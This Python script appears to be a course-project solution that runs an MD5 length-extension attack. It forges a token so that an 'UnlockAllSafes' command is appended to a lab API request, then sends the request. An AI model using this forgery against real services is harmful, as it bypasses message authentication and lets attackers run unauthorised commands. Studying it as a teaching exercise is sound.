from pymd5 import md5, padding
from urllib import parse, request
import urllib
import http
# m = "Use HMAC, not hashes"
# h = md5()
# h.update(m.encode())
# print(str(h.hexdigest()))

orig = "http://cis551.cis.upenn.edu/project2/api?token="
token = "0c6edcc81c7714b37a87cee7bb1f3d89"
part2 = "user=aturing&command1=ListSquirrels&command2=NoOp"
part3 = "&command3=UnlockAllSafes"

print(len("&user=aturing&command1=ListSquirrels&command2=NoOp"))
# 10 character password at the beginning 

times = 2
h = md5(state=bytes.fromhex(token), count=(512 * times))

pad = parse.quote(padding((len(part2) + 10)*8))
print(len(padding((len(part2) + 10)*8)))

padHex = padding(len(part2)*8).hex()

h1 = md5(state=bytes.fromhex(token) + padding(len(part2)*8), count=512)

h.update(part3.encode())
h1.update(part3.encode())

print(str(h.hexdigest()))
print(str(h1.hexdigest()))

newurl = orig + token + "&" +  part2 + pad
print(newurl)
newurl2 = orig + str(h.hexdigest()) + "&" + part2 + pad + part3
print(newurl2)

parsedUrl = urllib.parse.urlparse(newurl2)
conn = http.client.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print(conn.getresponse().read())

# http://cis551.cis.upenn.edu/project2/api?token=0c6edcc81c7714b37a87cee7bb1f3d89&user=aturing&command1=ListSquirrels&command2=NoOp